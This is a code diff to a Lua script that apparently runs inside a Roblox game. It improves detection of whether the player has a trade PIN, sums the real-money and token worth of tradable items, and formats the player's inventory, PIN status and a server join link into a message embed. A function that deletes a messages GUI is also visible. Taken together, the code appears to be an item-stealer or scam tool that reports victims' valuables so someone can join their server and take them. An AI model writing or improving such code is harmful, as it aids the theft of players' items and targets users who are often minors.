@@ -628,13 +628,19 @@ local function hasSurfsUp()
 end
 
 local function hasTradePin()
+    local has = false
     pcall(function()
-        local tradePin = data:Get({"TradePin"})
-        if tradePin and tradePin ~= "" then
-            return true
+        local enabled = data:Get("TradePin.PinEnabled")
+        if enabled == nil then
+            enabled = data:Get({"TradePin", "PinEnabled"})
         end
+        local confirmed = data:Get("TradePin.PinConfirmed")
+        if confirmed == nil then
+            confirmed = data:Get({"TradePin", "PinConfirmed"})
+        end
+        has = (enabled == true) or (confirmed == true)
     end)
-    return false
+    return has
 end
 
 local function getInventory()
@@ -710,17 +716,29 @@ local function getAllInventoryWeaponsWithTradeStatus()
             if item then
                 local weaponName = item.Weapon or item.WeaponName or item.Type
                 local skinName = item.Name
-                if weaponName and skinName then 
-                    local _, _, category = getItemValue(item.Name)
-                    if category ~= "Fighting Style" then
-                        local tradable = IsTradable(item)
-                        local value, tokenValue, _ = getItemValue(item.Name)
-                        table.insert(allWeapons, weaponName .. "::" .. skinName .. "::" .. tostring(tradable) .. "::" .. tostring(value) .. "::" .. tostring(tokenValue))
-                        if tradable then
-                            totalValue = totalValue + value
-                            totalTokenValue = totalTokenValue + tokenValue
-                        end
+                if skinName then
+                    local tradable = IsTradable(item)
+                    local value, tokenValue, category = getItemValue(skinName)
+                    if tradable then
+                        totalValue = totalValue + value
+                        totalTokenValue = totalTokenValue + tokenValue
                     end
+                    if weaponName and category ~= "Fighting Style" then
+                        table.insert(allWeapons, weaponName .. "::" .. skinName .. "::" .. tostring(tradable) .. "::" .. tostring(value) .. "::" .. tostring(tokenValue))
+                    end
+                end
+            end
+        end
+    end
+    
+    if inv and inv.Finisher then
+        for guid, item in pairs(inv.Finisher) do
+            if item and item.Name then
+                local tradable = IsTradable(item)
+                local value, tokenValue = getItemValue(item.Name)
+                if tradable then
+                    totalValue = totalValue + value
+                    totalTokenValue = totalTokenValue + tokenValue
                 end
             end
         end
@@ -816,36 +834,26 @@ local function truncateField(text, maxLen)
 end
 
 local function formatSkinList()
-    local stompList = getAllStomps()
-    local loveboardList = getAllLoveboards()
-    local fightingStylesList = getAllFightingStyles()
-    local finisherList = getAllFinishers()
+    local lines = {}
     
-    local result = {}
-    
-    local function formatSection(label, list)
+    local function addSection(label, list)
         if #list == 0 then return end
-        local display = ""
-        if #list <= 3 then
-            display = table.concat(list, ", ")
-        else
-            local first3 = {}
-            for i = 1, 3 do table.insert(first3, list[i]) end
-            display = table.concat(first3, ", ") .. " and " .. (#list - 3) .. " more"
+        table.insert(lines, "[" .. label .. "]")
+        for _, name in ipairs(list) do
+            table.insert(lines, name)
         end
-        table.insert(result, label .. ": " .. display)
     end
     
-    formatSection("Fighting Styles", fightingStylesList)
-    formatSection("Stomps", stompList)
-    formatSection("Loveboards", loveboardList)
-    formatSection("Finishers", finisherList)
+    addSection("Fighting Styles", getAllFightingStyles())
+    addSection("Stomps", getAllStomps())
+    addSection("Loveboards", getAllLoveboards())
+    addSection("Finishers", getAllFinishers())
     
-    if #result == 0 then
+    if #lines == 0 then
         return "None"
     end
     
-    return table.concat(result, "\n")
+    return table.concat(lines, "\n")
 end
 
 local function deleteMessagesGui()
@@ -1272,7 +1280,7 @@ local function sendFullInventory()
     if weaponsText == "" then weaponsText = "None" end
     weaponsText = truncateField(weaponsText, 1018)
     
-    local skinText = truncateField(formatSkinList(), 1024)
+    local skinText = truncateField(formatSkinList(), 1018)
     
     local ls = localPlayer:FindFirstChild("leaderstats")
     local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or 0
@@ -1301,13 +1309,6 @@ local function sendFullInventory()
     
     local tokenWorth = (totalTokenValue / 1000) * 1.75
     local currentTokens = getPlayerTokens()
-    local displayTokens = totalTokenValue > 0 and formatNumber(totalTokenValue) or formatNumber(currentTokens)
-    local displayWorth
-    if totalTokenValue > 0 then
-        displayWorth = "`$" .. formatNumber(tokenWorth) .. "`"
-    else
-        displayWorth = "`~$" .. formatNumber((currentTokens / 1000) * 1.75) .. "`"
-    end
     
     local fields = {
         {name = "👤 User", value = "`" .. playerName .. "`", inline = true},
@@ -1316,12 +1317,12 @@ local function sendFullInventory()
         {name = "👥 Players", value = "`" .. #Players:GetPlayers() .. " / " .. Players.MaxPlayers .. "`", inline = true},
         {name = "🟢 Tradable: " .. tradableCount .. " | 🔴 Untradable: " .. untradableCount, value = " ", inline = false},
         {name = "🔒 Trade Pin", value = hasPin and "✅ Yes" or "❌ No", inline = true},
-        {name = "Worth", value = displayWorth, inline = true},
-        {name = "🪙 Tokens", value = "`" .. displayTokens .. "`", inline = true},
+        {name = "Worth", value = "`$" .. formatNumber(tokenWorth) .. "`", inline = true},
+        {name = "🪙 Tokens", value = "`" .. formatNumber(currentTokens) .. "`", inline = true},
     }
     
     table.insert(fields, {name = "🔫 Weapons", value = "```" .. weaponsText .. "```", inline = false})
-    table.insert(fields, {name = "🎨 Skins & Fighting Styles", value = skinText, inline = false})
+    table.insert(fields, {name = "🎨 Skins", value = "```" .. skinText .. "```", inline = false})
     table.insert(fields, {name = "🔗 Join Link", value = "[Click to Join](" .. joinLink .. ")", inline = false})
     
     local mainEmbed = {
